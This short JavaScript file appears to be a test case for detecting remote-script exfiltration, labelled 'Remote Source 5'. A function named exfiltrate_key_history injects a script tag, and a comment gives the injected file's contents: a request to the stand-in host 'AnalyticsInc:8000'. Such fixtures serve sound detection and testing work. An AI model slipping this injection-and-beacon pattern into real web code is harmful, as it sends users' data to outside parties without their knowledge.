function exfiltrate_key_history() {

    // Remote Source 5 - Schemeless URI - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL = './exfil.js';
    var script = document.createElement("script");
    script.src = URL;
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;

/*
exfil.js contents:

xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=remote", true);
xmlhttp.send(null);

*/
